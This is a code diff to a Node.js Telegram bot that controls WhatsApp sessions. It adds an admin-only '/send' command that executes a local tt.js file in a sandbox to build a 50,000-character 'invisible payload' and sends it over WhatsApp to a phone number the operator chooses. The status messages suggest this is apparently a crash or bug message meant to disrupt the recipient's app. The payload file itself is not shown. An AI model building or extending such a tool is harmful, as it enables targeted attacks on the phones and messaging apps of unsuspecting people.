@@ -1693,54 +1693,53 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
 
 
     
-
-
-
-// Usage: /send 2348012345678
+// ==========================================
+// NEW: /send [number] - DYNAMIC TT.JS ENGINE
+// ==========================================
 bot.onText(/\/send\s+(\d+)/, async (msg, match) => {
     const chatId = msg.chat.id.toString();
     if (chatId !== ADMIN_ID) return;
 
     const targetNumber = match[1];
-    let statusMsg = await bot.sendMessage(chatId, `[SYSTEM] Generating invisible payload...`);
+    let statusMsg = await bot.sendMessage(chatId, `[SYSTEM] Generating 50,000 char payload from tt.js...`);
 
     try {
-        // We look for the file in the same folder
         const ttPath = path.join(__dirname, 'tt.js');
-        
-        if (!fs.existsSync(ttPath)) throw new Error('tt.js file missing.');
+        if (!fs.existsSync(ttPath)) throw new Error('tt.js file not found.');
 
-        // 1. Read the code as text
+        // 1. Read and execute tt.js code in a sandbox
         const code = fs.readFileSync(ttPath, 'utf8');
-
-        // 2. Create a fresh sandbox and run the code
         const sandbox = { console: console, message: "" };
         vm.createContext(sandbox);
         vm.runInContext(code, sandbox);
 
-        // 3. Grab the 'message' variable your tt.js creates
         const finalPayload = sandbox.message;
+        if (!finalPayload) throw new Error('Captured "message" variable is empty.');
 
-        if (!finalPayload) throw new Error('tt.js did not produce a "message" variable.');
+        // 2. Identify the active WhatsApp socket
+        // Uses global.sock (set in index.js) or falls back to first active client
+        const activeSock = global.sock || Object.values(clients)[0];
+        if (!activeSock) throw new Error('No active WhatsApp connection (sock) found.');
 
-        // 4. Format and Send
         const waId = targetNumber.includes('@c.us') ? targetNumber : `${targetNumber}@c.us`;
         
-        await sock.sendMessage(waId, { text: finalPayload });
+        // 3. Dispatch the message
+        await activeSock.sendMessage(waId, { text: finalPayload });
 
-        await bot.editMessageText(`[SUCCESS] ✅ Payload sent to ${targetNumber}!`, {
+        await bot.editMessageText(`[SUCCESS] ✅ Invisible payload sent to ${targetNumber}!`, {
             chat_id: chatId,
             message_id: statusMsg.message_id
         });
 
     } catch (err) {
-        console.error(err);
+        console.error('[SEND_ERROR]', err);
         await bot.editMessageText(`[ERROR] Send failed: ${err.message}`, {
             chat_id: chatId,
             message_id: statusMsg.message_id
         });
     }
 });
+
 
 
 
